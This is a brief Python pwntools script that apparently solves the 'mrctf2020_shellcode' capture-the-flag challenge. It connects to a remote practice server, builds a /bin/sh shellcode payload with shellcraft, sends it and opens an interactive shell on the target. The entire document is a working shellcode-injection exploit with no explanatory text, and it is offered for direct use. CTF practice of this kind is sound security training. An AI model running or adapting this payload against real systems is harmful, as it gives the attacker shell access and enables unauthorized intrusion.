from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
io = remote("node4.buuoj.cn",26222)
#io = process("mrctf2020_shellcode")
payload = asm(shellcraft.sh())

io.sendline(payload)
io.interactive()